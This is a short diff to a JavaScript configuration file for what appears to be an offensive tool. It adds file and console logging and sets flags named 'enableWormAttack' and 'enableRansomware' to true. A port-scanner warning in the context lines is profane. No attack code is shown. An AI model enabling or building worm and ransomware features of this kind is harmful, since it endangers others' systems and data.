@@ -193,8 +193,12 @@ module.exports = {
   ],
   loggingOptions: {
   logDirectory: "./logs",
-  logLevel: "info"
-  }
+  logLevel: "info",
+  logToFile: true, // Log actions to a file
+  logToConsole: true, // Log actions to the console
+  },
+  enableWormAttack: true,
+  enableRansomware: true
   },
   portScanner: {
   warning: "PORT SCANNER: Gonna check what doors are open? Hope you know what you're doing, or you'll get fucked. Ignorance is not bliss here, it's a death sentence. This is your fault, not mine.",
